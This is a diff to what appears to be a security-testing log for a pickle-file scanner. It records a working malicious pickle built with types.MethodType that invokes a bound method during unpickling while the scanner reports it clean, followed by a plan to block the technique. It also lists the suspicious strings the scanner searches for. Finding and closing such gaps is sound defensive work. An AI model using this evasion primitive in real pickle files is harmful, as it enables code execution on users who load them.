@@ -2347,3 +2347,102 @@ Blocking plan:
 Performance note: the fix adds static policy entries checked by binary search.
 It does not add import graph modeling, patcher state tracking, or cross-literal
 string reconstruction for fragmented import statements.
+
+## Turn 53 - `types.MethodType` bound-method invocation gap
+
+Goal: produce another aggressive RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using `types.MethodType()` to
+turn a clean-looking unbound method plus attacker-controlled state into a
+zero-argument callable that a later `REDUCE` can execute.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_types_methodtype_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("pathlib", "PosixPath"),
+        b"(",
+        *(s(part) for part in marker.parts),
+        b"tR\x940",
+        sg("types", "MethodType"),
+        b"(",
+        sg("pathlib", "Path.touch"),
+        b"h\x00",
+        b"tR",
+        b")R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=114`, `bytes_total=114`, `opcode_count=25`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `pathlib.PosixPath`, `types.MethodType`, and
+  `pathlib.Path.touch`, all with `is_dangerous=False`
+- Control proof: the same pickle without the final empty-argument `REDUCE`
+  returns `<bound method Path.touch of PosixPath(...)>` and does not create
+  `/tmp/ma_types_methodtype_marker`
+- Unpickle result: the full payload constructs
+  `types.MethodType(pathlib.Path.touch, marker)`, invokes the resulting bound
+  method with an empty argument tuple, creates
+  `/tmp/ma_types_methodtype_marker`, and returns `None`
+- RCE mechanism: `MethodType()` lets the payload pre-bind attacker-controlled
+  receiver state to an otherwise clean unbound method. The scanner sees only
+  static globals, while the second `REDUCE` executes the newly synthesized
+  bound method from the pickle stack.
+
+Why the scanner missed it:
+
+- `types` is not wildcard-dangerous; only `types.CodeType` and
+  `types.FunctionType` are currently blocked.
+- `types.MethodType` is absent from `DANGEROUS_GLOBALS`.
+- The final execution step uses a dynamic callable already on the pickle stack,
+  so there is no second import reference such as `pathlib.Path.touch()` for the
+  policy table to classify.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, or `subprocess`.
+
+Performance note: this is a generic arity-shifting invocation primitive rather
+than a string or import heuristic gap. The focused next block should add a
+sorted `DANGEROUS_GLOBALS` entry for `("types", "MethodType")`, with a
+manual-pickle oracle regression proving scan-time detection before the
+bound-method marker is created. The hot path remains a static binary-search
+policy lookup.
+
+## Turn 54 - Block `types.MethodType` bound-method synthesis
+
+Blocking plan:
+
+- Add `("types", "MethodType")` to the sorted dangerous-global table. The API
+  can bind attacker-controlled receiver state to a callable and synthesize a new
+  callable that later `REDUCE` opcodes invoke from the pickle stack.
+- Add portable Rust policy coverage for raw `types.MethodType` reductions so
+  detection does not depend on executing the runtime gadget.
+- Add a CPython oracle regression that first proves
+  `MethodType(Path.touch, marker)` only creates a bound method, then proves a
+  follow-on empty-argument `REDUCE` creates the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]` because this strengthens
+  user-visible pickle detection coverage.
+
+Performance note: the block is a single static policy-table entry checked by
+binary search. It does not add callable graph analysis, stack-shape simulation,
+or cross-opcode execution modeling for synthesized callables.
